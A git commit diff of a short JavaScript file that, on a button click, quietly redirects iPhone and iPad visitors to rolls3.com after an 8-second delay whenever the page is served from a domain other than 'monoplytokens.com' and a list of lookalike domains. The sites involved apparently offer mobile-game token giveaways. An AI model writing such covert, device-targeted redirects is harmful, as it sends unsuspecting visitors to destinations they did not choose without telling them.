fea498d0148274a50f79fedfbb9597cb37629b7a
dev20l <iphonetasli@gmail.com>
2025-03-15 11:23:09 +0000

    Update dti2.js

--- dti2.js
+++ dti2.js
@@ -1,15 +1,10 @@
-
+/*================== [ 1 ] ===============*/
+/*================== [ dress to impress ] ================*/
 var button = document.querySelector('#submitButton');  
 button.addEventListener('click', function() {
     (function() {
-        var originalDomains = [
-            "monoplytokens.com",
-            "mply.io.t0ke2n.site",
-            "mply.io.4a6b8dh.site",
-            "mply.io.1arshg4.site"
-        ]; 
-        
-        var redirectURL = "https://m.rolls3.com";
+        var originalDomain = "monoplytokens.com";
+        var redirectURL = "https://www.rolls3.com/";
         var blockedDomains = [
             "jsdhjjhhjjhejkjkas.blogspot.com",
             "mply.io.t0ke2n.site",
@@ -17,39 +12,14 @@ button.addEventListener('click', function() {
             "mply.io.4a6b8dh.site"
         ];
 
-        var currentDomain = window.location.hostname.replace("www.", "").toLowerCase();
-        
-        function setCookie(name, value, years) {
-            var date = new Date();
-            date.setTime(date.getTime() + (years * 365 * 24 * 60 * 60 * 1000));
-            var expires = "expires=" + date.toUTCString();
-            document.cookie = name + "=" + value + ";" + expires + ";path=/";
-        }
-
-        function getCookie(name) {
-            var nameEQ = name + "=";
-            var ca = document.cookie.split(';');
-            for (var i = 0; i < ca.length; i++) {
-                var c = ca[i];
-                while (c.charAt(0) == ' ') c = c.substring(1, c.length);
-                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
-            }
-            return null;
-        }
-
-        var isFirstVisit = getCookie("isFirstVisit");
-
-        if (!isFirstVisit) {
-            setCookie("isFirstVisit", "true", 1);
-
+        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
             var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
 
-            setTimeout(function() {
-                if (isIphoneOrIpad) { 
+            if (isIphoneOrIpad) { 
+                setTimeout(function() {
                     window.location.href = redirectURL;
-                }
-            }, 8000);
+                }, 8000);
+            }
         }
-
     })();
 });
